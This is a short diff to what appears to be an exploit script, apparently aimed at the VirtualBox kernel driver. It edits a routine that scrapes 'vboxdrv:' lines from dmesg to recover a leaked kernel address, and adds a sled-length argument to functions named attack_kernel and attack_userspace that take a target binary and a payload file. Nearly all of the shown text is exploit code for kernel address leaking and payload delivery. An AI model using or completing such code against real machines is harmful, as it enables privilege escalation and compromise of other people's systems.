@@ -74,10 +74,10 @@ def leaked(start_leaker, search_for):
         leak = leaker.recv().decode('utf-8').replace('\r', '')
         leak = [l for l in leak.split('\n') if 'vboxdrv:' in l and search_for in l]
         if len(leak) < 1:
-            return
+            continue
         leak = leak[-1].split()
         if len(leak) < 3:
-            return
+            continue
         leak = int(leak[-2], 16)
     return leak, leaker
 
@@ -172,7 +172,7 @@ def attack_userspace(target_binary, payload_file, sled_length):
     leaker.shutdown('send')
     leaker.shutdown()
 
-def attack_kernel(target_binary, payload_file):
+def attack_kernel(target_binary, payload_file, sled_length):
     leak, leaker = leaked(['dmesg', '--color=never'], target_binary)
     leaker.shutdown()
     print('Leaked address is', str(hex(leak)))
